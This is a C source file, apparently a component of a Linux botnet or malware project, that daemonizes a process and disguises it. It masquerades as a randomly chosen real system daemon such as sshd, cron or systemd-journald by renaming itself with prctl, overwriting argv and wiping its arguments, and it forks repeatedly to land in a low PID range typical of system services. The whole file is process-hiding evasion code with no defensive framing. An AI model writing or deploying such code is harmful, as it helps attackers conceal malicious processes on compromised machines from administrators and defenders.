#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>

#include "headers/daemon.h"
#include "headers/util.h"
#include "headers/rand.h"

static const char *system_processes[] = {
    "/lib/systemd/systemd-journald",
    "/lib/systemd/systemd-udevd",
    "/usr/lib/accountsservice/accounts-daemon",
    "/usr/lib/snapd/snapd",
    "/usr/lib/upower/upowerd",
    "/usr/lib/packagekit/packagekitd",
    "/usr/lib/policykit-1/polkitd",
    "/usr/lib/fwupd/fwupd",
    "/usr/lib/boltd/boltd",
    "/usr/lib/udisks2/udisksd",
    "/usr/sbin/cron",
    "/usr/sbin/rsyslogd",
    "/usr/sbin/sshd",
    "/usr/sbin/NetworkManager",
    "/usr/sbin/cupsd",
    "/usr/sbin/apache2",
    "/usr/sbin/nginx",
    "/usr/bin/dbus-daemon"
};

char *hidden_process_name = NULL;

static void hide_process(int argc, char **argv) {
    const int total = sizeof(system_processes) / sizeof(system_processes[0]);
    const char *new_name = system_processes[rand_next() % total];

    hidden_process_name = strdup(new_name);
    
    prctl(PR_SET_NAME, (unsigned long)new_name);

    size_t name_len = strlen(new_name);
    size_t avail_len = strlen(argv[0]);
    
    if (name_len <= avail_len) {
        strncpy(argv[0], new_name, avail_len);
    } else {
        strncpy(argv[0], new_name, avail_len - 1);
        argv[0][avail_len - 1] = '\0';
    }
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
}

static void adjust_pid_range() {
    pid_t current_pid = getpid();
    if (current_pid >= 300 && current_pid <= 999) return;

    int attempts = 0;
    while (attempts++ < 100) {
        pid_t child = fork();
        if (child == 0) {
            return;
        } else if (child > 0) {
            exit(0);
        }
        usleep(100000);
    }
}

void daemonize(int argc, char **argv) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    for (int i = sysconf(_SC_OPEN_MAX); i >= 0; i--) close(i);
    
    chdir("/");
    
    umask(0);
    
    int null_fd = open("/dev/null", O_RDWR);
    dup2(null_fd, STDIN_FILENO);
    dup2(null_fd, STDOUT_FILENO);
    dup2(null_fd, STDERR_FILENO);
    if (null_fd > STDERR_FILENO) close(null_fd);
    
    adjust_pid_range();
    
    hide_process(argc, argv);

    char self_fd0[32];
    snprintf(self_fd0, sizeof(self_fd0), "/proc/%d/fd/0", getpid());
    int fd0 = open(self_fd0, O_RDONLY);
    if (fd0 >= 0) {
        dup2(fd0, STDIN_FILENO);
        close(fd0);
    }
}
